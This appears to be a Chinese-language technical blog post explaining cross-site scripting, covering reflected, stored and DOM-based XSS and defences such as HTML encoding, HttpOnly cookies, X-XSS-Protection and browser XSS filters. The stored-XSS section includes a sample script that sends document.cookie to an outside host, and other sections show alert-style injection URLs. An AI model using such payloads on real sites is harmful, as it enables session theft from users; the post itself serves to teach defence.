---
title: XSS
date: 2018-11-23 22:32:05
tags: 技术
---

#### 什么是XSS

XSS又称CSS，全称Cross SiteScript，跨站脚本攻击，是Web程序中常见的漏洞。

XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。如，盗取用户Cookie、破坏页面结构、重定向到其它网站等。

#### 危害

![](./img/xss危害.png)

这么多~~

#### 有哪些注入的方法和途径：

- 在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。
- 在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。
- 在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。
- 在标签的 href、src 等属性中，包含 javascript: 等可执行代码。
- 在 onload、onerror、onclick 等事件中，注入不受控制代码。
- 在 style 属性和标签中，包含类似 background-image:url("javascript:..."); 的代码（新版本浏览器已经可以防范）。
- 在 style 属性和标签中，包含类似 expression(...) 的 CSS 表达式代码（新版本浏览器已经可以防范）。

>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。

#### 分类

##### 1、反射型xss攻击

又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。

反射型ＸＳＳ也被称为非持久性ＣＳＳ。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成ＸＳＳ漏洞。这个过程就像一次反射，故称为反射型ＸＳＳ。

```
正常发送消息：

http://www.test.com/message.php?send=Hello,World！

接收者将会接收信息并显示Hello,Word

非正常发送消息：

http://www.test.com/message.php?send=<script>aldert(‘foolish!’)</script>！

接收者接收消息显示的时候将会弹出警告窗口
```

##### 2、存储型xss攻击

Stored XSS是存储式XSS漏洞，由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。


a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“www.b.com?param=”+document.cookie)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。

Stored XSS漏洞危害性更大，危害面更广。

##### 3、DOMBasedXSS（基于dom的跨站点脚本攻击）

基于DOM的XSS有时也称为type0XSS。当用户能够通过交互修改浏览器页面中的DOM(DocumentObjectModel)并显示在浏览器上时，就有可能产生这种漏洞，从效果上来说它也是反射型XSS。

通过修改页面的DOM节点形成的XSS，称之为DOMBasedXSS。

前提是易受攻击的网站有一个HTML页面采用不安全的方式从document.location 或document.URL 或 document.referrer获取数据（或者任何其他攻击者可以修改的对象）。
　　
var pos= document.URL.indexOf("name=")+5;

var len = document.URL.substring(pos,document.URL.length);  

document.write(len);  

>
这个页面，name是截取URL中get过来的name参数  
正常操作：  
http://www.vulnerable.site/welcome.html?name=Joe  
非正常操作：  
http://www.vulnerable.site/welcome.html?name=<script>a1lert(document.cookie)</script>


### 防御

#### 类似这些操作要小心

innerHTML、.outerHTML、document.write()

#### HTML Encode

用户将数据提交上来的时候进行HTML编码，将相应的符号转换为实体名称再进行下一步的处理。

```
比如用户输入：<script>window.location.href=”http://www.baidu.com”;</script>，保存后最终存储的会是：&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。
```

#### 过滤或移除特殊的Html标签

例如: &lt;script&gt;, &lt;iframe&lt; , &lt; for &lt;, &gt; for &gt;, &quot for

##### 过滤JavaScript 事件的标签

例如 "onclick=", "onfocus" 等等。

#### 将重要的cookie标记为http only

这样的话Javascript 中的document.cookie语句就不能获取到cookie了.

#### 表单数据规定值的类型

例如：年龄应为只能为int、name只能为字母数字组合

>这里有个国人写的xss过滤的  https://jsxss.com/zh/index.html

#### Secure标记

标记为 Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端。

#### X-XSS-Protection

让浏览器去做xss筛选，起到保护作用。

只要在HTTP响应报文的头部增加一个X-XSS-Protection 字段，明确地告诉浏览器XSS filter/auditor该如何工作。 

X-XSS-Protection 的字段有三个可选配置值：

- 0： 表示关闭浏览器的XSS防护机制
- 1：删除检测到的恶意代码，如果响应报文中没有看到X-XSS-Protection 字段，那么浏览器就认为X-XSS-Protection配置为1，这是浏览器的默认设置
- 1; mode=block：如果检测到恶意代码，在不渲染恶意代码


### 浏览器XSS过滤策略

从IE8 开始，IE 浏览器内置了一个针对XSS攻击的防护机制，这个浏览器内置的防护机制就是所谓的XSS filter，这个防护机制主要用于减轻反射型XSS 攻击带来的危害。 基于Webkit 内核的浏览器（比如Chrome）随后也增加一个名为XSS auditor 的防护机制，作用和IE中的XSS filter类似。这两种XSS防护机制的目的都很简单，如果浏览器检测到了含有恶意代码的输入被呈现在HTML文档中，那么这段呈现的恶意代码要么被删除，要么被转义，恶意代码不会被正常的渲染出来，当然了，浏览器是否要拦截这段恶意代码取决于浏览器的XSS防护设置。

怎么设置策略。看上面“X-XSS-Protection”

***

IE引入的XSS filter。
有一堆的正则表达式。
每一行正则式代表一条规则。IE在判断时会扫描URL，对匹配上的正则表达式的url报警，提示发现xss攻击并将字符替换为“#“。

***

chrome XSSAuditor的工作原理
chrome的XSSAuditor也被整合到了渲染引擎WebKit中。

当网页加载时，XSSAuditor会在页面之前苹果用户的输入。它首先评估用户输入是否包含有恶意内容，如果有就拦截。XSSAuditor也会检查用户是否会“反射”到正在渲染的页面中。

***

***原理的区别：***  
与IE不同的是，chrome的XSSAuditor并没有使用正则的形式去判断。chrome的xss过滤是在词法解析阶段进行的。在解析网页时，html代码会被分解成不同的token（每个token即一个元素），XSSAuditor会逐一审查token，将token中存在的危险属性、字段和url比较，若url中也有同样的内容，则XSSAuditor会认为这是一个反射型xss攻击，随后会对该字段进行过滤处理。


例如在检查如下代码 

```
\<iframe src="x" onerror="ale2rt(6)"\>\</iframe\>
```

会依次做如下判断:  

- 1.检查开始标签iframe，如果包含属性src、onerror,则认为可能危险，继续检查
- 2.如果src 不是以javascript:开头，则安全，放行。
- 3.onerror中包含脚本，检查这段代码是否同样出现在url中。
- 4.如果出现在url中，认为这个地方有问题，这段代码会被过滤成&lt;iframe src="x" onerror="void(0)"&gt;&lt;/iframe&gt; 如果没有出现在url中，认为这个地方没有问题，继续。
- 5.检查终止标签iframe，没有问题，全流程结束


>火狐浏览器为什么没有xss filter机制
>XSS攻击也应正了安全圈内非常有名的一句话：所有的输入都是有害的。